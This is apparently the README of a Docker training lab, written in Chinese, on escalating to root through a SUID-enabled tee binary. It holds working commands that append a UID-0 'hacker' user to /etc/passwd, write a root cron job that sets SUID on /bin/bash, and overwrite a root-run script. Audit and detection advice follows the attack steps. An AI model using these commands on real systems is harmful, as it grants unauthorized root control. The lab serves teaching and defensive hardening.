# SUID tee 任意文件写提权（组合拳）

## 快速使用（一键利用）

### 第一步：宿主机启动环境（仅这一步在宿主机）

```bash
cd ~/linux-privesc-lab/suid-tee-write
docker compose up -d --build
docker exec -it suid-tee-write su - lowpriv   # 密码 lowpriv123
```

### 第二步：容器内确认漏洞环境

```bash
id
find / -perm -4000 -type f 2>/dev/null
# 预期: /usr/bin/tee 带 SUID
ls -la /opt/exploits/
```

### 一键利用（容器内）

```bash
cd /opt/exploits && bash exploit.sh
```

## 原理

/usr/bin/tee 被设置了 **SUID 位**：任何用户运行它，进程 euid=0（root）。
tee 的作用是"把 stdin 写入文件并输出"——于是 lowpriv 可以用 SUID tee
**以 root 权限向任意文件写入**，但没有 shell。组合拳思路：

```
/usr/bin/tee (SUID, euid=0, 任意文件写, 无 shell)
  ├─ 拳法1: tee -a 追加 /etc/passwd -> UID=0 用户 -> su
  ├─ 拳法2: tee 写 /etc/cron.d/ -> cron 定时提权
  └─ 拳法3: tee 覆盖 backup.sh -> cron 执行恶意脚本
```

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：/usr/bin/tee 带 SUID 位（`-rwsr-xr-x`）
- 预置场景：root 的 cron 每分钟执行 /usr/local/bin/backup.sh

## 手动利用（分步教学）

### 拳法 1：追加 /etc/passwd 加 root 用户（最简洁）

```bash
# 1. 生成哈希 (明文 123456)
openssl passwd -1 -salt hacker 123456
# 输出: $1$hacker$6luIRwdGpBvXdP.GMwcZp/

# 2. 用 SUID tee 追加 (euid=0 写入, 无需 sudo!)
echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:root:/root:/bin/bash' | /usr/bin/tee -a /etc/passwd > /dev/null

# 3. 验证并登录
tail -1 /etc/passwd
echo 123456 | su hacker -c 'id'
# 预期: uid=0(root) 提权成功
```

### 拳法 2：写计划任务

```bash
# SUID tee 写 root cron 任务 (无需 sudo)
echo '* * * * * root chmod u+s /bin/bash' | /usr/bin/tee /etc/cron.d/pwn > /dev/null
sleep 65
/bin/bash -p -c 'id'     # euid=0(root)
```

### 拳法 3：覆盖 cron 脚本（预置 backup.sh 场景）

```bash
# 构造恶意脚本并覆盖
printf '#!/bin/bash\nchmod u+s /bin/bash\n' | /usr/bin/tee /usr/local/bin/backup.sh > /dev/null
sleep 65
/bin/bash -p -c 'id'
```

## 为什么能成功

| 环节 | 说明 |
|:---|:---|
| SUID tee | 运行 tee 时 euid=0，写文件用 root 权限（与属主无关） |
| tee -a | 追加写不破坏原文件 |
| 组合目标 | passwd（认证回退）/ cron.d（定时执行）/ 脚本（被 root 调用） |

与 sudo tee 的区别：**无需任何授权**，只要二进制带 SUID 即可利用——
比 sudo 配置错误更隐蔽（ls -l 看到 s 位但不显眼）。

## 防御

- 排查并去除 tee 的 SUID 位（`chmod u-s /usr/bin/tee`）
- 定期 `find / -perm -4000` 审计，对比基线
- 高危"写文件"程序（tee/cp/dd/install）绝不加 SUID

## 扩展教学（网络搜索整理）

### 发现技巧

```bash
find / -perm -4000 -type f 2>/dev/null | xargs ls -l
# 重点看: tee cp dd install mv 这类"写文件"工具
```

### SUID 写文件类程序汇总

| 程序 | SUID 后果 | 组合目标 |
|:---|:---|:---|
| tee | root 任意写 | passwd / cron.d / authorized_keys |
| cp | root 任意覆盖 | 脚本 / passwd / sudoers |
| dd | root 任意写 | 同上 |
| install | root 任意写 | 同上 |
| openssl | 无 shell 但可读文件 | shadow -> john |

### 为什么 SUID 比 sudo 更危险

- 无需密码、无需授权规则、无需交互
- ls -l 显示 s 位，但管理员常只关注 find/python/vim，忽略 tee
- 审计脚本大多只扫 sudo -l 和常见 SUID，tee 类容易被漏

### 检测

```bash
find / -perm -4000 -type f -mtime -30 2>/dev/null    # 新增 SUID
getcap -r / 2>/dev/null                               # 顺带查 capabilities
```

## 验证记录

2026-08-26 实机验证：`echo 'hacker:...' | /usr/bin/tee -a /etc/passwd` 追加 UID=0 用户后，`su hacker`（密码 123456）输出 `uid=0(root) gid=0(root) groups=0(root)`，复现成功。
